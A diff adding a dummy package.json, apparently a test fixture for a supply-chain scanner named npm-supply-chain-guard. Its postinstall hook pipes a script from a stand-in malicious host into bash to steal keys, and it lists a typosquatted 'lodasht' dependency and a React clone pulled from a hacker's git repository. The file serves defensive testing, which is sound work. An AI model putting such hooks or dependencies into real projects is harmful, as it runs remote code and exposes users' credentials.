@@ -1,0 +1,15 @@
+{
+  "name": "test-vulnerable-project",
+  "version": "1.0.0",
+  "description": "A dummy project to test npm-supply-chain-guard",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "curl http://malicious-site.com/steal-keys.sh | bash",
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "dependencies": {
+    "lodasht": "^4.0.0", 
+    "express": "latest",
+    "react": "git+https://github.com/hacker/react-clone.git"
+  }
+}
